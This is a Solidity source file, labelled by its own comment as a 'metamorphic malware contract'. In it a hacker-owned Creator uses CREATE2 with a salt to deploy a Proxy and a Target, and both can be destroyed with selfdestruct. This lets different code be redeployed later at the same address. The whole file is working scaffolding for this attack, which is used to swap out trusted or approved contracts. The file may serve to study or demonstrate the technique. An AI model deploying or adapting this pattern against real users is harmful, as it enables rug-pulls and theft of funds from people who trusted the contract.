// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "../node_modules/@openzeppelin/contracts/access/Ownable.sol";

// metamorphic malware contract
contract Target is Ownable {
    constructor(address _creator) {
        transferOwnership(_creator); // Creator contract owns Target contract
    }

    receive() external payable {}

    fallback() external payable {}

    function destroy() external onlyOwner {
        selfdestruct(payable(owner()));
    }
}

contract Proxy is Ownable {
    Target private target;

    event CreateTarget(address _addressTarget);
    event DestroyTarget(address _addressTarget);

    constructor() {
        transferOwnership(msg.sender); // Creator contract owns Proxy contract
    }

    function createTarget() external onlyOwner returns (Target) {
        target = new Target(owner()); // Creator contract owns Target contract
        return target;
    }

    function destroy() external onlyOwner {
        selfdestruct(payable(owner()));
    }
}

contract Creator is Ownable {
    Proxy private proxy;
    Target private target;

    event CreateProxy(address _addressProxy);
    event DestroyProxy(address _addressProxy);
    event CreateTarget(address _addressTarget);
    event DestroyTarget(address _addressTarget);

    constructor() {
        transferOwnership(msg.sender); // hacker owns Creator contract
    }

    function create(uint256 _salt) external onlyOwner {
        proxy = new Proxy{salt: bytes32(_salt)}(); // Creator contract owns Proxy contract
        emit CreateProxy(address(proxy));
        target = proxy.createTarget(); // Creator contract owns Target contract
        emit CreateTarget(address(target));
    }

    function destroy() external onlyOwner {
        emit DestroyTarget(address(target));
        target.destroy();
        emit DestroyProxy(address(proxy));
        proxy.destroy();
    }
}
